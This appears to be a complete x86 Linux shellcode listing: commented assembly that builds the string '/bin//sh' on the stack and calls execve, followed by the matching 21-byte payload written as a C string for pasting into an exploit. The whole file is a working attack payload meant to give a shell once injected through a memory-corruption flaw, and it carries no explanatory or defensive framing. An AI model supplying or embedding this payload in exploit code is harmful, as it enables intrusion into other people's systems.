.text
.globl _start
_start:
	xorl %ecx, %ecx		# ecx = 0
	mul %ecx		# eax = edx = ecx = 0
	pushl %edx		# null-terminator byte(s)
	pushl $0x68732f2f	# //sh
	pushl $0x6e69622f	# /bin
	movl %esp, %ebx		# "/bin//sh" addr
	movb $0xb, %al		# sys_execve
	int $0x80		# syscall

# char shellcode[] = "\x31\xc9\xf7\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
# /* Total: 21 bytes. */
